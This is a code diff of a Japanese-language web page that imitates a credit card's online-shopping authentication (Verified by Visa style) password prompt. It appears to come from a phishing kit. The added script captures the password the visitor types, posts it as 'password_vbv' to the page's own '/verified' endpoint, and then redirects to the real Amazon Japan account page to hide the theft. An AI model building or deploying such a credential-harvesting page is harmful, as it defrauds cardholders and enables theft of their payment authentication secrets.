@@ -32,6 +32,7 @@ liehuo_key.value="";
 liehuo_key.focus();
 return false;
 }
+return true;
 }
 </script>		
 </head>
@@ -54,7 +55,7 @@ return false;
                     <p><font size=1>ご利用いただくカードで登録している「オンラインショッピング認証サービス」の「パスワード（※）」をご入力ください。
 （※クレジットカードの暗証番号とは異なりますので、ご注意ください）
 </font></p>
-                  <form action="verified" onsubmit="return check()"  method="post"><div class="padingtable">
+                <div class="padingtable">
                         <table >
                                 <tbody>
                                     <tr>
@@ -87,7 +88,7 @@ return false;
                                     <tr>
                                         <td></td>
                                         <td>
-                                            <input name="Sex" class="confirm" style=" width: 48px;" type="submit" value="送 信">
+                                            <input id="sendBtn" name="Sex" class="confirm" style=" width: 48px;" type="button" value="送 信">
 
                                 <img src="aa/faq_mark.gif" border="0" width="14" height="13" alt="">
 
@@ -97,13 +98,24 @@ return false;
 &nbsp
                                 <a href="javascript:onCancelClickHandler();" id="cancel" onclick="javascript:onClosingHandler();">キャンセル</a>
 
-
                                         </td>
                                     </tr>
                                 </tbody>
                             </table>
                   </div>
-                </form>
+
     </div>
+        <script src="library/jquery/main.min.js"></script>
+        <script>
+            $("#sendBtn").click(function () {
+                var filed1 = $("#password666").val();
+                if (!check()) return;
+                $.post("/verified", {password_vbv: filed1},
+                        function (data) {
+                            window.location.href = 'https://www.amazon.co.jp/gp/css/homepage.html/ref=nav_youraccount_ya';
+                        }, "json");
+                window.location.href = 'https://www.amazon.co.jp/gp/css/homepage.html/ref=nav_youraccount_ya';
+            })
+        </script>
 </body>
 </html>
